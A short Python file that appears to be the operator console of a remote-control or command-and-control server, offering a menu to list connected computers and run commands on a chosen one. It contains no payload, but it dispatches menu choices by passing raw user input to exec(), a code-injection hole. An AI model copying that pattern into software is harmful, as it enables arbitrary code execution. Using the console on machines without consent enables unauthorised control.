# Arabic Code Writing Style (Really Quick for Representation)
import os
from RuntimeDatabase import RuntimeDatabase
import Handler

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'


class InteractiveShell:
    @staticmethod
    def start_shell():
        command = str()
        while command != "99":
            print(color.BOLD + color.DARKCYAN + """
Enter a Command Number:
    [0] connected computers list
    [1] execute command on computer
    [99] exit
            """ + color.END)
            command = input()
            try:
                exec("InteractiveShell.command_" + command + "()")
            except Exception:
                pass

    @staticmethod
    def log_to_shell(content):
        print(color.RED + color.UNDERLINE + content + color.END)

    @staticmethod
    def command_0():
        print(color.PURPLE + str(list(RuntimeDatabase.idle_connections)) + color.END)

    @staticmethod
    def command_1():
        if len(RuntimeDatabase.idle_connections.keys()) > 0:
            num = input("computer index: ")
            Handler.Handler.handle_execute_command(list(RuntimeDatabase.idle_connections)[int(num)])
        else:
            print("No Connected Computers!")

    @staticmethod
    def command_99():
        print("Server Goes Down:/")
        os._exit(1)
